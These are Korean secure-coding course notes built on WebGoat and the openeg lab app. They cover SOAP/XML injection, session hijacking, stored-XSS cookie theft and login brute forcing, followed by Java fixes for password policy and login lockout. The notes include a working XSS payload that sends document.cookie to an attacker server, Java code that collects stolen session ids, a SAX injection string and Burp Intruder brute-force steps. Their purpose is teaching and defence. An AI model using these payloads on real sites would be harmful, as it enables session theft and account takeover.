# XPath Injection

XPath -> xml path





*****

wsdl -> open API 설명 문서(web servicd description language)

wsdl을 볼때는 맨 밑의 wsdl:service부터 본다



binding 밑의 operation이 method

operation밑의 input이 parameter



*****

webgoat-> Web Services -> create a SOAP Request

밑쪽의 파일 보기를 누르면 xml이 뜬다

service부분

```xml
<wsdl:service name="SoapRequestService">
	<wsdl:port binding="impl:SoapRequestSoapBinding" name="SoapRequest">
  		<wsdlsoap:address location="http://70.12.224.218:8181/WebGoat/services/SoapRequest" /> 
  	</wsdl:port>
</wsdl:service>
```



binding 부분

```xml
<wsdl:binding name="SoapRequestSoapBinding" type="impl:SoapRequest">
  <wsdlsoap:binding style="rp8c" transport="http://schemas.xmlsoap.org/soap/http" /> 
    <!-- mehtod1 -->
	<wsdl:operation name="getFirstName">
  		<wsdlsoap:operation soapAction="" /> 
        <wsdl:input name="getFirstNameRequest">
            <wsdlsoap:body encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" namespace="http://lessons.webgoat.owasp.org" use="encoded" /> 
        </wsdl:input>
        <wsdl:output name="getFirstNameResponse">
  			<wsdlsoap:body encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" namespace="http://70.12.224.218:8181/WebGoat/services/SoapRequest" use="encoded" /> 
  		</wsdl:output>
  	</wsdl:operation>
    
<!-- ... -->
</wsdl:binding>

```





WSDL Scanning

-> packet을 캡쳐해서 다음과 같이 바꿈

* header

```text
POST http://xxx.xxx.xxx.xxx:xxxx/WebGoat/services/SoapRequest HTTP/1.0
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
Referer: http://192.168.111.128:8080/WebGoat/attack?Screen=39&menu=1900
Accept-Language: ko
Content-Type: text/xml
Proxy-Connection: Keep-Alive
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Paros/3.2.13
Host: 192.168.111.128:8080
Content-length: 59
Pragma: no-cache
Cookie: JSESSIONID=984C8EF36602A2839CF3DE1B28464897; ASPSESSIONIDQQDQSSBT=OGNFNHNDNAJMCJIMABEBPLIJ; ASPSESSIONIDQQARRRDT=ABKLOKODBHHMKAPEFJDDEKOJ
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
SOAPAction: /
```



* body

```text
<?xml version="1.0" encoding="UTF-8" ?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP-ENV:Body>
<ns1:getFirstName SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="http://lessons">
<id xsi:type="xsd:int">101</id>
</ns1:getFirstName>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```





Web Service SAX injection

input 태그에

`a</password><id xsi:type='xsd:int'>199</id><password xsi:type='xsd:string'>a`

입력





*****

# 세션



* 세션 하이재킹

해킹 머신의 firefox로 openeg에 접속 -> 도구 -> Live HTTP headers를 열어놓고 admin/openeg로 로그인하면 정보가 뜬다

![1](https://user-images.githubusercontent.com/20276476/76925119-ba5e5800-691b-11ea-9aa7-ecfe568bbe78.png)

cookie 부분을 복사



ie를 열어 openeg로 접속 후 위의 것을 클릭(cookie setting)

![2](https://user-images.githubusercontent.com/20276476/76925188-ee397d80-691b-11ea-847f-a861a585d39a.png)



복사한 것을 붙여놓고 앞의 cookie부분만을 지움

![3](https://user-images.githubusercontent.com/20276476/76925225-132df080-691c-11ea-999b-eef4fd4c075f.png)



set을 누르고 게시판을 누르면 admin으로 로그인 된다





사용자의 추가적인 확인이 필요하다

ip는 변동이 있을 수 있으므로 쓰기 힘들다

User-Agent 정보를 쓸 수 있다 ->  이것도 헤더에서 보고 바꿀 수 있기 때문에 쓸 수 없다.



그럼 어떻게?



application측에선 막을 방법이 없다

보안쿠키를 써야 함 ->script로 파싱이 되지 않는다



##### 링크 누르면 스크립트 돌아가서 쿠키 가져오기

쿠키 탈취하기(ASP게시판 사이트에서 쿠키를 받게 된다,이 사이트는 XSS 취약점이 있다)

1. 이해커가 ASP게시판에 다음과 같은 글을 올려 놓는다		

​	제목:공짜로 아이템 줍니다(유혹될 만한 글을 올린다)	

​	글 내용은 이렇게

```html
<div id='img'></div>	
<!-- 여기의 이미지를 가져온다 (a.do는 해커가 짜 놓은 것 - 밑의 java파일)-->
<script>document.getElementById("img").innerHTML="<img src='http://xxx.xxx.xxx.xxx:xxxx/openeg/test/a.do?	sessionid="+document.cookie+"' />";</script>
```

**(일반적인 내용으로 글을 먼저 등록한 뒤 수정시에 위 내용을 넣는다)**

(openeg의 ip와 포트로 셋팅)



2. 이해커는 자신의 서버 프로그램(TestController.java)에 다음과 같이 작성해 놓는다.

```java
@RequestMapping(value="/test/a.do")	
@ResponseBody	
public void testSecureCookie2(HttpServletRequest request, HttpServletResponse response) {		
    String clientSessionId=request.getParameter("sessionid");						System.out.println("Hacked clientSessionId:"+clientSessionId);	
    
    try {			
        File imgFile=new File("C:\\SecureCoding\\workspace\\.metadata\\.plugins\\org.eclipse.wst.server.core\\tmp0\\wtpwebapps\\openeg\\img\\hit.jpg");
        FileInputStream in=new FileInputStream(imgFile);
        ByteArrayOutputStream bs=new ByteArrayOutputStream();
        byte[] buffer=new byte[1024];
        int readlength=0;
        
        while((readlength=in.read(buffer)) != -1){
            bs.write(buffer,0,readlength);
        }
        
        byte[] imgbuf=null;
        imgbuf=bs.toByteArray();
        
        bs.close();
        in.close();
        
        int length=imgbuf.length;
        ServletOutputStream out=response.getOutputStream();
        out.write(imgbuf,0,length);			
        out.close();
    } catch (Exception e){
        e.printStackTrace();	
    }	
}
```

shirt + ctrl + o 누르기 ->  -> java.io에 들어간 걸로 선택



3. `C:\\SecureCoding\\workspace\\.metadata\\.plugins\\org.eclipse.wst.server.core\\tmp0\\wtpwebapps\\openeg\\img`에 들어 간 후 hit.jpg파일을 확인



4. 익명이 ASP게시판 사이트(게임 사이트라 가정)를 이용하려 링크를 클릭한다.

5. 익명이 이 글을 클릭하는 순간 자신의 세션id가 이해커에게 넘어간다. (제대로 되지 않을 때에는 브라우저 보안 수준을 내린다. 또는 a/a로 openeg에 로그인 후 주소 창에다 http://xxx.xxx.xxx.xxx:xxxx/openeg/test/a.do)을 복사하여 hit.jpg가 나오는지 확인 후 다시 해보기)-> 하나의 창에서 해야됨

   

6. ![4](https://user-images.githubusercontent.com/20276476/76927314-fac0d480-6921-11ea-972d-a9943e96e7c2.png)

   탈취완료



어떻게 막을 것인가

* 중요한 쿠키는 보안쿠키로



* node.js의 경우

  -> 우리가 만든 프로젝트에서는 header를 주지 않으므로 전달 할 수 없다

  -> 그럼 클리아언트에서 받아서 변경? httponly 옵션이 되는지 검색

  ex) jquery httponly등



#### #### 인증 관리 취약점

* 비밀번호 낮은 자리수, 암호화 저장 안하는 것 등
* 로그인 시 시도 횟수 제한, 로그인 제한이 걸린 후 조치 방법



1. 패스워드 암호화

   뒤에서 공부



2. 인증 시도 횟수 공격(brute force)

   1. 파로스 끄기 -> 바탕화면의 burpsuite 폴더 -> start_burp 실행(paros 고급판임)

   2. i accept 누르기

   3. proxy tab -> options tab -> 127.0.0.1:8081 확인

   4. intercept tab -> 트랩이랑 똑같음  계속 트랩이니 on을 눌러 off로 꺼줌

   5. history tab으로 가 놓은 후 openeg 로그인 a/a(홍길동)

   6. POST를 찾아서 오른 클릭후 해당 항목 클릭

      ![5](https://user-images.githubusercontent.com/20276476/76929580-e253b880-6927-11ea-9527-b3e6e91fca34.png)

   7. Intruder의 Position tab에서 오른쪽의 clear 누름

   8. userId부분을 a -> admin으로 직접 고침

   9. userPw부분의 a를 클릭 후 오른쪽 add클릭하면 $a$로 바뀜

   10. payload tab으로 이동

   11. 구글에 `10000 top passwords` 검색 후 아무 사이트 들어가서  목록 복사 후 해커머신에서 메모장 하나 생성해서 붙여넣기 후 저장

   12. payload tab에 load 클릭 후 메모장 불러오기  -> 목록에 들어와짐

       ![6](https://user-images.githubusercontent.com/20276476/76930089-095eba00-6929-11ea-98bc-515e46deca96.png)

       

   13. 위 메뉴 Intruder -> start attack을 누르면 공격이 시작된다

       (여러개 켜서 하면 DDos공격도 덤으로 된다)

       ![7](https://user-images.githubusercontent.com/20276476/76930141-2a270f80-6929-11ea-867d-3920e3d28800.png)

       위에서 볼 때 Length가 다른것이 패스워드를 찾은 것(로그인 된 페이지가 로딩)



*****

어떻게 방어할 것인가



* java

1. openeg -> java Resources -> src -> config/message.properties 생성(회원가입시 안내 메세지 설정)

  그냥 file로 만들면 됨

  ```text
  field.required=required Field
  field.invalidPattern=invalid Pattern
  ```

  

2. kr.co.openeg.lab.member.service -> MemberValidate.java 수정(회원가입시 패스워드 검수)

   ```java
   package kr.co.openeg.lab.member.service;
   
   import java.util.regex.Matcher;
   import java.util.regex.Pattern;
   
   import kr.co.openeg.lab.member.model.MemberModel;
   
   import org.springframework.validation.Errors;
   import org.springframework.validation.Validator;
   
   public class MemberValidatior implements Validator {
      	@Override	
       public boolean supports(Class<?> clazz) {		
           return MemberModel.class.isAssignableFrom(clazz);	
       }
       
      	@Override	
       public void validate(Object target, Errors errors) {
           MemberModel memberModel = (MemberModel)target;				
           
           if(memberModel.getUserId() == null || memberModel.getUserId().trim().isEmpty()){
               errors.rejectValue("userId", "field.required",null,"필수 입력 항목입니다");		
           }				
           
           if(memberModel.getUserPw() == null || memberModel.getUserPw().trim().isEmpty()){
               errors.rejectValue("userPw", "field.required",null,"필수 입력 항목입니다");		
           } else {	
               if(!verify(memberModel.getUserPw())){			
                   errors.rejectValue("userPw", "field.invalidPattern",null,"알파벳 대소문자,숫자,특수문자 포함 8자리 이상이어야 합니다");			
               }		
           }				
           
           if(memberModel.getUserName() == null || memberModel.getUserName().trim().isEmpty()){
               errors.rejectValue("userName", "field.required",null,"필수 입력 항목입니다");		
           }
      	}		
       
       // 패스워드 정책
       public boolean verify(String password){		
           String passwordPolicy="((?=.*[a-zA-Z])(?=.*[0-9@#$%]).{8,})";	
           Pattern p=Pattern.compile(passwordPolicy);		
           // 패스워드가 완전히 일치하는지 봄
           Matcher m=p.matcher(password);	
           return m.matches();	
       }
   }
   ```

   

3. LoginController.java 수정(인증 시도 횟수 3회 제한,30초 락,IP 확인)

   ```java
   package kr.co.openeg.lab.login.controller;
   
   import java.util.Date;
   import javax.annotation.Resource;
   import javax.servlet.http.HttpServletRequest;
   import javax.servlet.http.HttpSession;
   
   import kr.co.openeg.lab.login.model.LoginSessionModel;
   import kr.co.openeg.lab.login.model.SecurityModel;
   import kr.co.openeg.lab.login.service.LoginService;
   import kr.co.openeg.lab.login.service.LoginValidator;
   
   import org.springframework.beans.factory.annotation.Autowired;
   import org.springframework.context.ApplicationContext;
   import org.springframework.context.support.ClassPathXmlApplicationContext;
   import org.springframework.stereotype.Controller;
   import org.springframework.validation.BindingResult;
   
   import org.springframework.web.bind.annotation.ModelAttribute;
   import org.springframework.web.bind.annotation.RequestMapping;
   import org.springframework.web.bind.annotation.RequestMethod;
   import org.springframework.web.servlet.ModelAndView;
   
   @Controller
   public class LoginController {	 
       @Resource(name="loginService")	
       private LoginService service;		
       
       @RequestMapping("/login.do")	
       public String login() {						
           return "/board/login";	
       }		
       
       @RequestMapping(value="/login.do", method = RequestMethod.POST)
       public ModelAndView loginProc(HttpServletRequest request,@ModelAttribute("LoginModel") LoginSessionModel loginModel, BindingResult result, HttpSession session) {		
           ModelAndView mav = new ModelAndView();				
           
           // form validation		
           new LoginValidator().validate(loginModel, result);		
           
           if(result.hasErrors()){			
               mav.setViewName("/board/login");			
               return mav;		
           }				
           
           String userId = loginModel.getUserId();		
           SecurityModel sec=service.checkSecurity(userId);	
           if(sec!=null){						
               if(sec.getRetry()>=3){				
                   long retryTime=new Date().getTime()-sec.getLastFailedLogin();
                   
                   // 30초동안 로그인 제한
                   if(retryTime<30000){
                       mav.addObject("userId",userId);		
                       mav.addObject("errCode",6);													mav.setViewName("/board/login");	
                       return mav;				
                   } else {				
                       sec.setRetry(0);	
                       sec.setLastFailedLogin(0);	
                       service.updateSecurity(sec);	
                   }			
               }		
           } else {
               sec=new SecurityModel();		
               sec.setUserId(userId);		
               service.insertSecurity(sec);
           }		
           
           String userPw = loginModel.getUserPw();		
           LoginSessionModel loginCheckResult = service.checkUserId(userId,userPw);			
           
           //check joined user		
           if(loginCheckResult == null){						
               sec.setUserId(userId);		
               sec.setRetry(sec.getRetry()+1);		
               sec.setLastFailedLogin(new Date().getTime());		
               service.updateSecurity(sec);	
               
               mav.addObject("retry",sec.getRetry());	
               mav.addObject("userId", userId);	
               mav.addObject("errCode", 5);	
               mav.setViewName("/board/login");		
               
               return mav; 	
           } else {
               sec.setRetry(0);	
               sec.setLastFailedLogin(0);		
               sec.setLastSuccessedLogin(new Date().getTime());
               sec.setClientIp(request.getRemoteAddr());
               
               service.updateSecurity(sec);
               
               session.setAttribute("sec",sec);	
               session.setAttribute("userId", userId);		
               session.setAttribute("userName", loginCheckResult.getUserName());
               mav.setViewName("redirect:/board/list.do");		
               
               return mav;	
           }			
       }		
       
       @RequestMapping("/logout.do")	
       public String logout(HttpSession session){		
           session.invalidate();		
           return "redirect:login.do";
       }
   }
   ```

   

4. SecurityModel.java 작성(login_history 테이블에 저장될 정보)

   ```java
   package kr.co.openeg.lab.login.model;
   
   public class SecurityModel {	
       private int loginFailedCount;	
       private long lastFailedLogin;	
       private long lastSuccessedLogin;	
       private String userId,clientIp;	
       
       public SecurityModel() {			}	
       
       public SecurityModel(int loginFailedCount, long lastFailedLogin, long lastSuccessedLogin) {		
           this.loginFailedCount = loginFailedCount;	
           this.lastFailedLogin = lastFailedLogin;	
           this.lastSuccessedLogin = lastSuccessedLogin;	
       }		
       
       public int getLoginFailedCount() {		
           return loginFailedCount;	
       }	
       
       public void setLoginFailedCount(int loginFailedCount) {	
           this.loginFailedCount = loginFailedCount;
       }		
       
       public long getLastFailedLogin() {			
           return lastFailedLogin;
       }		
       
       public void setLastFailedLogin(long lastFailedLogin) {	
           this.lastFailedLogin = lastFailedLogin;			
       }	
       
       public long getLastSuccessedLogin() {		
           return lastSuccessedLogin;	
       }		
       
       public void setLastSuccessedLogin(long lastSuccessedLogin) {
           this.lastSuccessedLogin = lastSuccessedLogin;		
       }	
       
       public int getRetry() {		
           return loginFailedCount;
       }	
       
       public void setRetry(int i) {	
           loginFailedCount=i;		
       }	
       
       public void setClientIp(String remoteAddr) {
           clientIp=remoteAddr;		
       }	
       
       public String getClientIp() {		
           return clientIp;		
       }	
       
       public String getUserId() {	
           return userId;	
       }		
       
       public void setUserId(String userId) {	
           this.userId = userId;	
       }
   }
   ```

   



5. ->kr.co.openeg.lab.login.service -> LoginService.java 수정(login_history 테이블에 추가될 정보 처리 메소드 추가)

   ```java
   package kr.co.openeg.lab.login.service;
   
   import javax.annotation.Resource;
   import kr.co.openeg.lab.login.dao.LoginDao;
   import kr.co.openeg.lab.login.model.LoginSessionModel;
   import kr.co.openeg.lab.login.model.SecurityModel;
   
   import org.springframework.orm.ibatis.SqlMapClientTemplate;
   import org.springframework.stereotype.Component;
   import org.springframework.stereotype.Service;
   
   @Service
   public class LoginService {		
       @Resource(name="loginDao")	
       private LoginDao dao;		
       
       public LoginSessionModel checkUserId(String userId) {	
           return dao.selectUserId(userId);	
       }	
       
   	public LoginSessionModel checkUserId(String userId, String userPw) {
           return dao.selectUserId(userId, userPw);	
       }
       
   	public SecurityModel checkSecurity(String userId) {		
           // TODO Auto-generated method stub		
           return dao.checkSecurity(userId);	
       }
       
   	public void updateSecurity(SecurityModel sec) {	
           dao.updateSecurity(sec);	
       }			
       
       public void insertSecurity(SecurityModel sec) {	
           dao.insertSecurity(sec);
       }
   }
   ```

   

6. LoginDao.java 수정(login_history 테이블에 추가될 정보 처리 메소드 추가)

   ```java
   package kr.co.openeg.lab.login.dao;
   
   import kr.co.openeg.lab.login.model.LoginSessionModel;
   import kr.co.openeg.lab.login.model.SecurityModel;
   
   public interface LoginDao {		
       LoginSessionModel selectUserId(String userId);	
       LoginSessionModel selectUserId(String userId, String userPw);
       SecurityModel checkSecurity(String userId);	
       
       void updateSecurity(SecurityModel sec);	
       void insertSecurity(SecurityModel sec) ;
   }
   ```

   

7. LoginDaoImpl.java 수정(login_history 테이블에 추가될 정보 처리 메소드 추가)

   ```java
   package kr.co.openeg.lab.login.dao;
   
   import kr.co.openeg.lab.login.dao.LoginDao;
   import kr.co.openeg.lab.login.model.LoginSessionModel;
   import kr.co.openeg.lab.login.model.SecurityModel;
   
   import org.springframework.orm.ibatis.SqlMapClientTemplate;
   import org.springframework.orm.ibatis.support.SqlMapClientDaoSupport;
   import org.springframework.stereotype.Component;
   
   public class LoginDaoImpl extends SqlMapClientDaoSupport implements LoginDao {
   	@Override	
       public LoginSessionModel selectUserId(String userId) {		
           return (LoginSessionModel)getSqlMapClientTemplate().queryForObject("login.loginCheck1", userId);
   	}		
       
       @Override	
       public LoginSessionModel selectUserId(String userId, String userPw) {	
           return (LoginSessionModel)getSqlMapClientTemplate().queryForObject("login.loginCheck2", new LoginSessionModel(userId, userPw, null, false));	
       }	
       
       @Override	
       public SecurityModel checkSecurity(String userId) {		
           // TODO Auto-generated method stub		
           return (SecurityModel)getSqlMapClientTemplate().queryForObject("login.checkSecurity",                userId);
       }	
       
       @Override	
       public void updateSecurity(SecurityModel sec) {	
           getSqlMapClientTemplate().update("login.updateSecurity", sec);
       }		
       
       @Override	
       public void insertSecurity(SecurityModel sec) {	
           getSqlMapClientTemplate().insert("login.insertSecurity", sec);
       }
   }
   ```

   

8. login.xml 수정(login_history 테이블에 추가될 정보 처리 쿼리 추가)

   ```xml
   <?xml version="1.0" encoding="UTF-8" ?>
   <!DOCTYPE sqlMap     PUBLIC "-//ibatis.apache.org//DTD SQL Map 2.0//EN"     "http://ibatis.apache.org/dtd/sql-map-2.dtd">  
   <sqlMap namespace="login">	
       <typeAlias alias="LoginModel" type="kr.co.openeg.lab.login.model.LoginSessionModel"/>	
       <typeAlias alias="SecurityModel" type="kr.co.openeg.lab.login.model.SecurityModel"/>		
       <insert id="insertSecurity" parameterClass="SecurityModel">		
           insert into login_history(userId, lastFailedLogin, lastSuccessedLogin, retry, clientIp)	values(#userId#, #lastFailedLogin#, #lastSuccessedLogin#, #loginFailedCount#,#clientIp#)	
       </insert>		
       <update id="updateSecurity" parameterClass="SecurityModel">		
       	update login_history set lastFailedLogin=#lastFailedLogin#, 	  lastSuccessedLogin=#lastSuccessedLogin#, retry=#loginFailedCount#where  userid=#userId#	
       </update>			
       <select id="checkSecurity" parameterClass="String" resultClass="SecurityModel">		
           select * from login_history	where userId=#userId#	
       </select>			
       <select id="loginCheck1" parameterClass="String" resultClass="LoginModel">		  select idx, userId, userPw, userName, joinDate from board_member where userId=#userId#	
       </select>		
       <select id="loginCheck2" parameterClass="LoginModel" resultClass="LoginModel">		
           select idx, userId, userPw,	userName, joinDate from board_member		where userId=#userId# and userPw=#userPw#	
       </select>
   </sqlMap>
   ```

   

9. kr.co.openeg.lab.common.interceptor -> SessionInterceptor.java 수정(Client IP 확인)

   ```java
   package kr.co.openeg.lab.common.interceptor;
   
   import javax.servlet.http.HttpServletRequest;
   import javax.servlet.http.HttpServletResponse;
   import javax.servlet.http.HttpSession;
   
   import kr.co.openeg.lab.login.model.SecurityModel;
   
   import org.springframework.web.servlet.ModelAndView;
   import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
   
   public class SessionInterceptor extends HandlerInterceptorAdapter{	
       @Override	
       public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
           // check variable		
           Object userId = request.getSession().getAttribute("userId");		
           
           //		
           if(request.getRequestURI().contains("/test/init_db.do") && "admin".equals(userId)) {	
               return true;	
           }
   
   		// pass through when access login.do, join.do		
           if(request.getRequestURI().equals("/openeg/login.do") || request.getRequestURI().equals("/openeg/member/join.do")){		
               if(userId != null){	
                   response.sendRedirect(request.getContextPath() + "/board/list.do");				
                   return true;		
               } else {				
                   return true;		
               }		
           }		
           //		
           // where other pages
           if(userId == null){			
               response.sendRedirect(request.getContextPath() + "/login.do");
               HttpSession session=request.getSession();	
               session.setAttribute("errCode", "4");
               return false;
           } else {
               HttpSession session=request.getSession();
               SecurityModel sec=(SecurityModel)session.getAttribute("sec");						
               if(sec==null){
                   session.invalidate();
                   response.sendRedirect(request.getContextPath() + "/login.do");
                   return true;
               }
               if(sec.getClientIp().equals(request.getRemoteAddr())){	
                   return true;	
               } else {	
                   return false;		
               }				
           }		
           //			
       }		
       
       @Override	
       public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {	}}
   ```

   

10. login.jsp 수정(30초 락 메세지 안내)

    ```jsp
    <%@ page language="java" contentType="text/html; charset=UTF-8"
    	pageEncoding="UTF-8"%>
    <%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>
    <%@ taglib uri="http://www.springframework.org/tags/form" prefix="form"%>
    <%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Login</title>
    <link href="<%=request.getContextPath()%>/css/main.css" rel="stylesheet"
    	type="text/css">
    <c:if test="${errCode == null}">
    	<c:set var="errCode" value="\"\""></c:set>
    </c:if>
    <script type="text/javascript">
    	function checkErrCode(){
    		var errCode = ${errCode};		
    		if(errCode != null || errCode != ""){
    			switch (errCode) {
    			case 1:
    				alert("가입된 사용자ID가 아닙니다!");
    				break;
    			case 2:
    				alert("비밀번호가 일치하지 않습니다!");
    				break;			
    			case 3:
    				alert("회원가입 처리가 완료되었습니다! 로그인 해 주세요!");
    				location.href = 
    					"<%=request.getContextPath()%>/login.do";
    				break;
    			case 4:
    				alert("로그인후에 사용가능합니다.");
    				break;
    			case 5:
    				alert("login failed");
    				break;
    			case 6:
    				alert("30초 뒤 다시 시도해 주세요");
    				break;
    			}
    		}
    	}
    </script>
    </head>
    <body onload="checkErrCode()">
    	<div id="container">
    
    		<h1>
    			<jsp:include page="header.jsp" />
    		</h1>
    
    
    		<div id="content-container">
    			<div id="content">
                  <jsp:include page="main.jsp" />
    			</div>
    		    <div id="aside">
    				<spring:hasBindErrors name="LoginModel" />
    				<form:errors path="LoginModel" />
    				<form action="login.do" method="post">
    					<fieldset>
    						<center>
    							<label for="userId">메일주소 : </label> <input type="text"
    								id="userId" name="userId" class="loginInput" value="${userId}" />
    							<span class="error"><form:errors path="LoginModel.userId" /></span><br />
    							<label for="userPw">비밀번호 : </label> <input type="password"
    								id="userPw" name="userPw" class="loginInput" /> <span
    								class="error"><form:errors path="LoginModel.userPw" /></span><br />
    							<br /> <input type="submit" value="로그인" class="submitBt" /> <input
    								type="button" value="회원가입" class="submitBt"
    								onClick='window.open("member/join.do","_blank","width=400,height=400, toolbar=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");' />
    						</center>
    					</fieldset>
    				</form>		    </div>
    			<div id="footer">
    				<jsp:include page="footer.jsp" />
    			</div>
    		</div>
    	</div>
    
    </body>
    </html>
    
    ```

    

